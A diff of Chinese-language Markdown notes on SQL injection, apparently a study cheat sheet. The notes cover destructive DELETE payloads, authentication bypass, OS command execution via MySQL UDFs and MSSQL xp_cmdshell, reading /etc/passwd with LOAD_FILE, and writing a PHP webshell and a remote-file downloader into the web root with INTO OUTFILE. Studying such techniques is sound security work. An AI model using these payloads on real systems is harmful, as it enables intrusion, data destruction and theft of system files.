@@ -61,14 +61,17 @@ temp
   * MySQL `DELETE FROM some_table WHERE 1; --`
 * 绕过判断
   * Auth Bypass:如web登录功能存在SQLi 使用"万能密码"实现Login Bypass
-* 系统命令执行
-  * MSSQL的`xp_cmdshell`
+* 系统命令执行(参考sqlmap)
+  * MySQL的用户自定义函数 - 上传一个二进制文件:共享库(shared library)到对应文件夹，它包含两个UDF(user-defined functions)用户自定义函数(函数作用都是执行系统命令). 然后在数据库创建该函数 并调用该函数 即可执行系统命令
+  * MSSQL的`xp_cmdshell` - 扩展存储过程(extended stored procedure) 它是SQL Server的配置项，启用时能让SQL Server账号执行操作系统命令，返回文本行
 * 文件读写 - 前提:当前数据库user有FILE权限(通常数据库root用户才会有)
   * 读取文件(Reading Files)
     * MySQL - `LOAD_FILE()`
-    * 例1 `SELECT LOAD_FILE('/etc/passwd');` `SELECT LOAD_FILE(0x2F6574632F706173737764);`
+    * 例1 `SELECT LOAD_FILE('/etc/passwd');` 
+    * 例2 `SELECT LOAD_FILE(0x2F6574632F706173737764);`
   * 写入文件(Writing Files)
-    * MySQL - `INTO OUTFILE` 或 `INTO DUMPFILE`
+    * MySQL - `select ... INTO OUTFILE` 能导出多行数据 会做格式处理(在行末端写入新行 会转义某些符号) 二进制文件会被破坏
+    * MySQL - `select ... INTO DUMPFILE` 只能导出一行数据 不做格式处理 导出二进制文件 内容完全不变 依旧可运行
     * 例1 写入WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
     * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
     * ...
